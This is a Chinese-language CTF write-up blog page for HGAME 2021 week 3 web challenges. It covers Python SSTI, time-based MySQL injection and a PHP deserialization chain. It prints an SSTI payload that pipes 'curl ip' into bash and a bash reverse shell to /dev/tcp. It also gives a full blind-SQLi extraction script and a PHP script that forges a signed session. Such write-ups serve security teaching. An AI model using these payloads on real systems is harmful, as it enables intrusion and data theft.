@@ -1,0 +1,690 @@
+<!DOCTYPE html>
+<html lang="en-us">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='Level - Week3 Forgetful 考点：简单python-SSTI
+题目是一个记事本，添加描述的时候存在SSTI，在查看页面可以看到SSTI已经成功了：
+最为常规的payload：
+{{[].__class__.__mro__[1].__subclasses__()}}{{[].__class__.__mro__[1].__subclasses__()[167].__init__.__globals__.__builtins__.__import__(&#39;os&#39;).popen(&#39;ls /&#39;).read()}}{{[].__class__.__mro__[1].__subclasses__()[167].__init__.__globals__.__builtins__.__import__(&#39;os&#39;).popen(&#39;curl ip|bash&#39;).read()}}因为命令执行处有waf，所以可以选择直接弹shell：
+nc -lvnp 8888bash -i &amp;gt;&amp;amp; /dev/tcp/ip/8888 0&amp;gt;&amp;amp;1姿势还是比较常规；
+分享一个从[].__class__.__mro__[1].__subclasses__()查找模块位置的脚本：
+#python 3 import re str = &amp;#39;&amp;#39;&amp;#39; [回显内容] &amp;#39;&amp;#39;&amp;#39; list = re.split(&amp;#39;,&amp;#39;, str) for i in range(0, len(list)): if &amp;#39;catch_warnings&amp;#39; in list[i]: print(i) break iki-Jail 考点：MySQL注入，单引号逃逸
+熟悉的登录框，熟悉的sql注入
+发现用户字段必须要邮箱才可以，而且如果开了Burp抓包之后会出现一些问题，导致Ajax不能工作。
+于是直接使用bp对login.php发包；
+进行了简单的fuzz，过滤如下：
+由单双引号过滤想到了\逃逸单引号，当我们用户名输入admin\的时候，语句变成了：
+SELECT * FROM user WHERE username=&amp;#39;admin\&amp;#39; AND password=&amp;#39;xxx&amp;#39; 那么xxx就变成了sql语句执行，造成了注入；
+结果发现只能延时注入：
+exp：
+#python3,wh1sper import requests import time host = &amp;#39;https://jailbreak.'><title>HGAME 2021 Writeup</title>
+
+<link rel='canonical' href='https://anthem-whisper.github.io/p/hgame-2021-writeup/'>
+
+<link rel="stylesheet" href="/scss/style.min.css"><meta property='og:title' content='HGAME 2021 Writeup'>
+<meta property='og:description' content='Level - Week3 Forgetful 考点：简单python-SSTI
+题目是一个记事本，添加描述的时候存在SSTI，在查看页面可以看到SSTI已经成功了：
+最为常规的payload：
+{{[].__class__.__mro__[1].__subclasses__()}}{{[].__class__.__mro__[1].__subclasses__()[167].__init__.__globals__.__builtins__.__import__(&#39;os&#39;).popen(&#39;ls /&#39;).read()}}{{[].__class__.__mro__[1].__subclasses__()[167].__init__.__globals__.__builtins__.__import__(&#39;os&#39;).popen(&#39;curl ip|bash&#39;).read()}}因为命令执行处有waf，所以可以选择直接弹shell：
+nc -lvnp 8888bash -i &amp;gt;&amp;amp; /dev/tcp/ip/8888 0&amp;gt;&amp;amp;1姿势还是比较常规；
+分享一个从[].__class__.__mro__[1].__subclasses__()查找模块位置的脚本：
+#python 3 import re str = &amp;#39;&amp;#39;&amp;#39; [回显内容] &amp;#39;&amp;#39;&amp;#39; list = re.split(&amp;#39;,&amp;#39;, str) for i in range(0, len(list)): if &amp;#39;catch_warnings&amp;#39; in list[i]: print(i) break iki-Jail 考点：MySQL注入，单引号逃逸
+熟悉的登录框，熟悉的sql注入
+发现用户字段必须要邮箱才可以，而且如果开了Burp抓包之后会出现一些问题，导致Ajax不能工作。
+于是直接使用bp对login.php发包；
+进行了简单的fuzz，过滤如下：
+由单双引号过滤想到了\逃逸单引号，当我们用户名输入admin\的时候，语句变成了：
+SELECT * FROM user WHERE username=&amp;#39;admin\&amp;#39; AND password=&amp;#39;xxx&amp;#39; 那么xxx就变成了sql语句执行，造成了注入；
+结果发现只能延时注入：
+exp：
+#python3,wh1sper import requests import time host = &amp;#39;https://jailbreak.'>
+<meta property='og:url' content='https://anthem-whisper.github.io/p/hgame-2021-writeup/'>
+<meta property='og:site_name' content='wh1sper'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' />
+<meta name="twitter:title" content="HGAME 2021 Writeup">
+<meta name="twitter:description" content="Level - Week3 Forgetful 考点：简单python-SSTI
+题目是一个记事本，添加描述的时候存在SSTI，在查看页面可以看到SSTI已经成功了：
+最为常规的payload：
+{{[].__class__.__mro__[1].__subclasses__()}}{{[].__class__.__mro__[1].__subclasses__()[167].__init__.__globals__.__builtins__.__import__(&#39;os&#39;).popen(&#39;ls /&#39;).read()}}{{[].__class__.__mro__[1].__subclasses__()[167].__init__.__globals__.__builtins__.__import__(&#39;os&#39;).popen(&#39;curl ip|bash&#39;).read()}}因为命令执行处有waf，所以可以选择直接弹shell：
+nc -lvnp 8888bash -i &amp;gt;&amp;amp; /dev/tcp/ip/8888 0&amp;gt;&amp;amp;1姿势还是比较常规；
+分享一个从[].__class__.__mro__[1].__subclasses__()查找模块位置的脚本：
+#python 3 import re str = &amp;#39;&amp;#39;&amp;#39; [回显内容] &amp;#39;&amp;#39;&amp;#39; list = re.split(&amp;#39;,&amp;#39;, str) for i in range(0, len(list)): if &amp;#39;catch_warnings&amp;#39; in list[i]: print(i) break iki-Jail 考点：MySQL注入，单引号逃逸
+熟悉的登录框，熟悉的sql注入
+发现用户字段必须要邮箱才可以，而且如果开了Burp抓包之后会出现一些问题，导致Ajax不能工作。
+于是直接使用bp对login.php发包；
+进行了简单的fuzz，过滤如下：
+由单双引号过滤想到了\逃逸单引号，当我们用户名输入admin\的时候，语句变成了：
+SELECT * FROM user WHERE username=&amp;#39;admin\&amp;#39; AND password=&amp;#39;xxx&amp;#39; 那么xxx就变成了sql语句执行，造成了注入；
+结果发现只能延时注入：
+exp：
+#python3,wh1sper import requests import time host = &amp;#39;https://jailbreak.">
+    </head>
+    <body class="">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.body.dataset.scheme = 'dark';
+        } else {
+            document.body.dataset.scheme = 'light';
+        }
+    })();
+</script><div class="container main-container flex on-phone--column extended article-page with-toolbar">
+            <aside class="sidebar left-sidebar sticky">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header class="site-info">
+        
+            <figure class="site-avatar">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu493b2ad2ace11203a689e4edf1306ab0_73291_300x0_resize_box_2.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+
+                
+                    <span class="emoji">🍥</span>
+                
+            </figure>
+        
+        <h1 class="site-name"><a href="https://anthem-whisper.github.io/">wh1sper</a></h1>
+        <h2 class="site-description">专注Web安全和代码审计</h2>
+    </header>
+
+    <ol class="menu" id="main-menu">
+        
+        
+        
+
+        <li >
+            <a href='/'>
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/about'>
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>About</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/archives'>
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/search'>
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+
+        
+            <li id="dark-mode-toggle">
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                <span>暗色模式</span>
+            </li>
+        
+    </ol>
+</aside>
+
+            <main class="main full-width">
+    <div id="article-toolbar">
+        <a href="https://anthem-whisper.github.io/" class="back-home">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="15 6 9 12 15 18" />
+</svg>
+
+
+
+            <span>Back</span>
+        </a>
+    </div>
+
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+
+    <h2 class="article-title">
+        <a href="/p/hgame-2021-writeup/">HGAME 2021 Writeup</a>
+    </h2>
+
+    </div>
+</header>
+
+    <section class="article-content">
+    <h2 id="level---week3">Level - Week3</h2>
+<h3 id="forgetful">Forgetful</h3>
+<p>考点：简单python-SSTI</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210214230828.png" alt="img"  /></p>
+<p>题目是一个记事本，添加描述的时候存在SSTI，在查看页面可以看到SSTI已经成功了：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210214230954.png" alt="image-20210214230953251"  /></p>
+<p>最为常规的payload：</p>
+<pre><code>{{[].__class__.__mro__[1].__subclasses__()}}
+{{[].__class__.__mro__[1].__subclasses__()[167].__init__.__globals__.__builtins__.__import__('os').popen('ls /').read()}}
+{{[].__class__.__mro__[1].__subclasses__()[167].__init__.__globals__.__builtins__.__import__('os').popen('curl ip|bash').read()}}
+</code></pre><p>因为命令执行处有waf，所以可以选择直接弹shell：</p>
+<pre><code>nc -lvnp 8888
+bash -i &gt;&amp; /dev/tcp/ip/8888 0&gt;&amp;1
+</code></pre><p>姿势还是比较常规；</p>
+<p>分享一个从<code>[].__class__.__mro__[1].__subclasses__()</code>查找模块位置的脚本：</p>
+<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="c1">#python 3</span>
+<span class="kn">import</span> <span class="nn">re</span>
+<span class="nb">str</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;
+</span><span class="s1">[回显内容]
+</span><span class="s1">&#39;&#39;&#39;</span>
+
+<span class="nb">list</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;,&#39;</span><span class="p">,</span> <span class="nb">str</span><span class="p">)</span>
+
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="nb">list</span><span class="p">)):</span>
+      <span class="k">if</span> <span class="s1">&#39;catch_warnings&#39;</span> <span class="ow">in</span> <span class="nb">list</span><span class="p">[</span><span class="n">i</span><span class="p">]:</span>
+            <span class="k">print</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+            <span class="k">break</span>
+</code></pre></div><h3 id="iki-jail">iki-Jail</h3>
+<p>考点：MySQL注入，单引号逃逸</p>
+<p>熟悉的登录框，熟悉的sql注入</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210215130850.png" alt="image-20210215130849132"  /></p>
+<p>发现用户字段必须要邮箱才可以，而且如果开了Burp抓包之后会出现一些问题，导致Ajax不能工作。</p>
+<p>于是直接使用bp对<code>login.php</code>发包；</p>
+<p>进行了简单的fuzz，过滤如下：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210215131112.png" alt="image-20210215131110567"  /></p>
+<p>由单双引号过滤想到了<code>\</code>逃逸单引号，当我们用户名输入<code>admin\</code>的时候，语句变成了：</p>
+<div class="highlight"><pre class="chroma"><code class="language-sql" data-lang="sql"><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="k">user</span> <span class="k">WHERE</span> <span class="n">username</span><span class="o">=</span><span class="s1">&#39;admin\&#39;</span> <span class="k">AND</span> <span class="n">password</span><span class="o">=</span><span class="s1">&#39;xxx&#39;</span>
+</code></pre></div><p>那么<code>xxx</code>就变成了sql语句执行，造成了注入；</p>
+<p>结果发现只能延时注入：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210215131035.png" alt="image-20210215131033385"  /></p>
+<p>exp：</p>
+<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="c1">#python3,wh1sper</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">time</span>
+
+<span class="n">host</span> <span class="o">=</span> <span class="s1">&#39;https://jailbreak.liki.link/login.php&#39;</span>
+
+<span class="k">def</span> <span class="nf">mid</span><span class="p">(</span><span class="n">bot</span><span class="p">,</span> <span class="n">top</span><span class="p">):</span>
+    <span class="k">return</span> <span class="p">(</span><span class="nb">int</span><span class="p">)(</span><span class="mf">0.5</span><span class="o">*</span><span class="p">(</span><span class="n">top</span><span class="o">+</span><span class="n">bot</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">transToHex</span><span class="p">(</span><span class="n">flag</span><span class="p">):</span>
+    <span class="n">res</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">flag</span><span class="p">:</span>
+        <span class="n">res</span> <span class="o">+=</span> <span class="nb">hex</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">i</span><span class="p">))</span>
+    <span class="n">res</span> <span class="o">=</span> <span class="s1">&#39;0x&#39;</span> <span class="o">+</span> <span class="n">res</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;0x&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">res</span>
+
+<span class="k">def</span> <span class="nf">sqli</span><span class="p">():</span>
+    <span class="n">name</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">200</span><span class="p">):</span>
+        <span class="n">top</span> <span class="o">=</span> <span class="mi">126</span>
+        <span class="n">bot</span> <span class="o">=</span> <span class="mi">32</span>
+        <span class="k">while</span> <span class="n">top</span> <span class="o">&gt;</span> <span class="n">bot</span><span class="p">:</span>
+            <span class="n">babyselect</span> <span class="o">=</span> <span class="s1">&#39;(database())&#39;</span><span class="c1">#week3sqli</span>
+            <span class="n">babyselect</span> <span class="o">=</span> <span class="s2">&#34;(select group_concat(table_name) from information_schema.TABLES where table_schema like database())&#34;</span><span class="c1">#u5ers</span>
+            <span class="n">babyselect</span> <span class="o">=</span> <span class="s2">&#34;(select group_concat(column_name) from information_schema.columns where table_name like 0x7535657273)&#34;</span><span class="c1">#usern@me,p@ssword</span>
+            <span class="n">babyselect</span> <span class="o">=</span> <span class="s2">&#34;(select `p@ssword` from week3sqli.u5ers)&#34;</span><span class="c1">#sOme7hiNgseCretw4sHidd3n</span>
+            <span class="n">babyselect</span> <span class="o">=</span> <span class="s2">&#34;(select `usern@me` from week3sqli.u5ers)&#34;</span><span class="c1">#admin</span>
+            <span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;^(if((ascii(substr({},{},1))&gt;{}),1,sleep(2)))#&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">babyselect</span><span class="p">,</span> <span class="n">j</span><span class="p">,</span> <span class="n">mid</span><span class="p">(</span><span class="n">bot</span><span class="p">,</span> <span class="n">top</span><span class="p">))</span>
+            <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
+                <span class="s2">&#34;username&#34;</span><span class="p">:</span> <span class="s2">&#34;admin</span><span class="se">\\</span><span class="s2">&#34;</span><span class="p">,</span>
+                <span class="s2">&#34;password&#34;</span><span class="p">:</span> <span class="n">payload</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">,</span> <span class="s1">&#39;/**/&#39;</span><span class="p">)</span>
+                <span class="c1">#^(if((ascii(1)&gt;55),sleep(3),sleep(3)))#这个确实延时成功了</span>
+            <span class="p">}</span>
+            <span class="k">try</span><span class="p">:</span>
+                <span class="n">start</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>
+                <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">host</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
+                <span class="k">print</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+                <span class="k">print</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span><span class="o">-</span><span class="n">start</span><span class="p">)</span>
+                <span class="k">if</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span><span class="o">-</span><span class="n">start</span> <span class="o">&lt;</span> <span class="mf">1.5</span><span class="p">:</span>
+                    <span class="n">bot</span> <span class="o">=</span> <span class="n">mid</span><span class="p">(</span><span class="n">bot</span><span class="p">,</span> <span class="n">top</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span>
+                <span class="k">else</span><span class="p">:</span>
+                    <span class="n">top</span> <span class="o">=</span> <span class="n">mid</span><span class="p">(</span><span class="n">bot</span><span class="p">,</span> <span class="n">top</span><span class="p">)</span>
+            <span class="k">except</span><span class="p">:</span>
+                <span class="k">continue</span>
+        <span class="n">name</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">top</span><span class="p">)</span>
+        <span class="k">print</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+    <span class="n">sqli</span><span class="p">()</span>
+    <span class="c1">#hgame{7imeB4se_injeCti0n+hiDe~th3^5ecRets}</span>
+
+</code></pre></div><p>hgame{7imeB4se_injeCti0n+hiDe~th3^5ecRets}</p>
+<h3 id="arknights">Arknights</h3>
+<p>考点：PHP反序列化</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210215121944.png" alt="image-20210215121933780"  /></p>
+<p>题目是一个类似于抽卡的网站，描述里面说&quot;r4u用git部署到了自己的服务器上&quot;，那么自然而然Githack把源码hack下来。</p>
+<p><a class="link" href="https://github.com/Anthem-whisper/CTFWEB_sourcecode/raw/main/HGAME2021/%5BHGAME2021%5DArknights.zip"  target="_blank" rel="noopener"
+    >source.zip</a></p>
+<p>在<code>simulator.php</code>我们可以看到有很多类，其中第146行</p>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="k">class</span> <span class="nc">Eeeeeeevallllllll</span><span class="p">{</span>
+    <span class="k">public</span> <span class="nv">$msg</span><span class="o">=</span><span class="s2">&#34;坏坏liki到此一游&#34;</span><span class="p">;</span>
+
+    <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span>
+    <span class="p">{</span>
+        <span class="k">echo</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">msg</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div><p>有一个echo操作，那么我们全局搜索<code>__toString</code>。第93行：</p>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="k">class</span> <span class="nc">CardsPool</span><span class="p">{</span>
+    <span class="nx">……</span>
+        
+    <span class="k">public</span> <span class="k">function</span> <span class="fm">__toString</span><span class="p">(){</span>
+        <span class="k">return</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div><p>pop链很明确，就看如何触发反序列化了。</p>
+<p>第137行<code>Session::extract()</code>:</p>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="k">public</span> <span class="k">function</span> <span class="nf">extract</span><span class="p">(</span><span class="nv">$session</span><span class="p">){</span>
+
+        <span class="nv">$sess_array</span> <span class="o">=</span> <span class="nx">explode</span><span class="p">(</span><span class="s2">&#34;.&#34;</span><span class="p">,</span> <span class="nv">$session</span><span class="p">);</span>
+        <span class="nv">$data</span> <span class="o">=</span> <span class="nx">base64_decode</span><span class="p">(</span><span class="nv">$sess_array</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
+        <span class="nv">$sign</span> <span class="o">=</span> <span class="nx">base64_decode</span><span class="p">(</span><span class="nv">$sess_array</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+
+        <span class="k">if</span><span class="p">(</span><span class="nv">$sign</span> <span class="o">===</span> <span class="nx">md5</span><span class="p">(</span><span class="nv">$data</span> <span class="o">.</span> <span class="nx">self</span><span class="o">::</span><span class="na">secret_key</span><span class="p">)){</span>
+            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">sessiondata</span> <span class="o">=</span> <span class="nx">unserialize</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
+        <span class="p">}</span><span class="k">else</span><span class="p">{</span>
+            <span class="nx">unset</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">sessiondata</span><span class="p">);</span>
+            <span class="k">die</span><span class="p">(</span><span class="s2">&#34;go away! you hacker!&#34;</span><span class="p">);</span>
+        <span class="p">}</span>
+</code></pre></div><p>他会把session的<code>.</code>前面的内容反序列化，并且会做一个加盐的判断，但是密钥在103行已经给了</p>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="k">const</span> <span class="no">SECRET_KEY</span> <span class="o">=</span> <span class="s2">&#34;7tH1PKviC9ncELTA1fPysf6NYq7z7IA9&#34;</span><span class="p">;</span>
+</code></pre></div><p>那么我们可以编写一个exp：</p>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+<span class="k">class</span> <span class="nc">Eeeeeeevallllllll</span>
+<span class="p">{</span>
+    <span class="k">public</span> <span class="nv">$msg</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span><span class="p">;</span>
+
+<span class="p">}</span>
+
+<span class="k">class</span> <span class="nc">CardsPool</span>
+<span class="p">{</span>
+
+    <span class="k">public</span> <span class="nv">$cards</span><span class="p">;</span>
+    <span class="k">private</span> <span class="nv">$file</span> <span class="o">=</span> <span class="s1">&#39;flag.php&#39;</span><span class="p">;</span>
+
+<span class="p">}</span>
+
+<span class="nv">$pop</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Eeeeeeevallllllll</span><span class="p">();</span>
+<span class="nv">$pop</span><span class="o">-&gt;</span><span class="na">msg</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">CardsPool</span><span class="p">();</span>
+<span class="c1">//echo serialize($pop);
+</span><span class="c1"></span><span class="nv">$key</span> <span class="o">=</span> <span class="s2">&#34;7tH1PKviC9ncELTA1fPysf6NYq7z7IA9&#34;</span><span class="p">;</span>
+<span class="nv">$sign</span> <span class="o">=</span> <span class="nx">md5</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$pop</span><span class="p">)</span><span class="o">.</span><span class="nv">$key</span><span class="p">);</span>
+<span class="nv">$payload</span> <span class="o">=</span> <span class="nx">base64_encode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$pop</span><span class="p">))</span><span class="o">.</span><span class="s1">&#39;.&#39;</span><span class="o">.</span><span class="nx">base64_encode</span><span class="p">(</span><span class="nv">$sign</span><span class="p">);</span>
+<span class="k">echo</span> <span class="nv">$payload</span><span class="p">;</span>
+<span class="cm">/*
+</span><span class="cm">$sess_array = explode(&#34;.&#34;, $payload);
+</span><span class="cm">$data = base64_decode($sess_array[0]);
+</span><span class="cm">echo $data,&#34;\n&#34;;
+</span><span class="cm">$sign = base64_decode($sess_array[1]);
+</span><span class="cm">echo $sign,&#34;\n&#34;;
+</span><span class="cm">if($sign === md5($data . $key)){
+</span><span class="cm">    unserialize($data);
+</span><span class="cm">}else{
+</span><span class="cm">    echo $sign;
+</span><span class="cm">    die(&#34;go away! you hacker!&#34;);
+</span><span class="cm">}
+</span><span class="cm">*/</span>
+
+</code></pre></div><p>发送session即可得到flag</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210215130724.png" alt="image-20210215130722662"  /></p>
+<h3 id="post-to-zuckonit20">Post to zuckonit2.0</h3>
+<p>考点：XSS</p>
+<p>网站是一个创建笔记的站点，存在XSS漏洞</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210216130625.png" alt="image-20210216130624020"  /></p>
+<p>在<code>/static/www.zip</code>给了源码：<a class="link" href="https://github.com/Anthem-whisper/CTFWEB_sourcecode/raw/main/HGAME2021/%5BHGAME2021%5DPost_to_zuckonit2.0.zip"  target="_blank" rel="noopener"
+    >source.zip</a></p>
+<p>和week2的XSS比起来多一个功能，可以替换批量字符串，并且在<code>/preview</code>查看替换的结果</p>
+<p>审计源码，在添加留言的存在一个waf：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210216125153.png" alt="image-20210216125152416"  /></p>
+<p>跟进函数：</p>
+<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="k">def</span> <span class="nf">escape_index</span><span class="p">(</span><span class="n">original</span><span class="p">):</span>
+    <span class="n">content</span> <span class="o">=</span> <span class="n">original</span>
+    <span class="n">content_iframe</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">sub</span><span class="p">(</span><span class="sa">r</span><span class="s2">&#34;^(&lt;?/?iframe)\s+.*?(src=[</span><span class="se">\&#34;</span><span class="s2">&#39;][a-zA-Z/]{1,8}[</span><span class="se">\&#34;</span><span class="s2">&#39;]).*?(&gt;?)$&#34;</span><span class="p">,</span> <span class="sa">r</span><span class="s2">&#34;\1 \2 \3&#34;</span><span class="p">,</span> <span class="n">content</span><span class="p">)</span><span class="c1">#只留src属性</span>
+    <span class="k">if</span> <span class="n">content_iframe</span> <span class="o">!=</span> <span class="n">content</span> <span class="ow">or</span> <span class="n">re</span><span class="o">.</span><span class="n">match</span><span class="p">(</span><span class="sa">r</span><span class="s2">&#34;^(&lt;?/?iframe)\s+(src=[</span><span class="se">\&#34;</span><span class="s2">&#39;][a-zA-Z/]{1,8}[</span><span class="se">\&#34;</span><span class="s2">&#39;])$&#34;</span><span class="p">,</span> <span class="n">content</span><span class="p">):</span>
+        <span class="k">return</span> <span class="n">content_iframe</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">content</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">sub</span><span class="p">(</span><span class="sa">r</span><span class="s2">&#34;&lt;*/?(.*?)&gt;?&#34;</span><span class="p">,</span> <span class="sa">r</span><span class="s2">&#34;\1&#34;</span><span class="p">,</span> <span class="n">content</span><span class="p">)</span>
+        <span class="k">return</span> <span class="n">content</span>
+</code></pre></div><p>可以看到只允许我们添加类似于<code>&lt;iframe scr=&quot;xxx&quot;&gt;</code>的标签，并且<code>xxx</code>限制在1-8位，显然没办法直接执行JS。</p>
